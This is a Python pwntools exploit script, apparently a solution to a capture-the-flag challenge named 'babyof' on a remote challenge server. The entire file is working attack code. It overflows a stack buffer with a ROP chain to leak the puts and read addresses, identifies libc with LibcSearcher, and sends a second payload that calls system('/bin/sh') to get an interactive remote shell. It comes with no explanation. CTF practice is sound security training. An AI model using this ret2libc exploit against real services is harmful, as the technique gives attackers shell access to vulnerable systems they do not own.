from pwn import *
from LibcSearcher import LibcSearcher

context(os="linux", arch="amd64", log_level="debug")

p = remote("node4.anna.nssnode.cn", 26631)

elf = ELF("temp/babyof")
rop = ROP(elf)
offset = 64 + 8
# main_addr = int(p.recvline().strip(), 16)
# base_addr = main_addr - elf.symbols["main"]
# backdoor = elf.symbols["backdoor"]
ret = rop.find_gadget(['ret']).address
pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
read_got = elf.got['read']
read_plt = elf.plt['read']
main_addr = 0x400632
payload =flat(b'a'*offset,
              pop_rdi,
              puts_got,
              puts_plt,
              pop_rdi,
              read_got,
              puts_plt,
              main_addr)
p.sendlineafter(b'overflow?', payload)
p.recvuntil(b'win\n')
puts_addr = u64(p.recvline(drop=True).ljust(8, b'\x00'))
print(f"puts_addr: {hex(puts_addr)}")
read_addr = u64(p.recvline(drop=True).ljust(8, b'\x00'))
print(f"read_addr: {hex(read_addr)}")
libc = LibcSearcher("puts", puts_addr)
libc.add_condition("read", read_addr)
candidates = list(libc)
print("候选 libc:", candidates)

puts_offset = libc.dump("puts")
system_offset = libc.dump("system")
libc_base = puts_addr - puts_offset
print(f"libc_base: {hex(libc_base)}")
assert libc_base & 0xfff == 0
system_addr = libc_base + system_offset
binsh_addr = libc_base + libc.dump("str_bin_sh")
# p.recvuntil(b'overflow?')
payload = flat(b'a'*offset,
            #   ret,
              pop_rdi,
              binsh_addr,
              system_addr)
p.sendlineafter(b'overflow?', payload)
p.interactive()
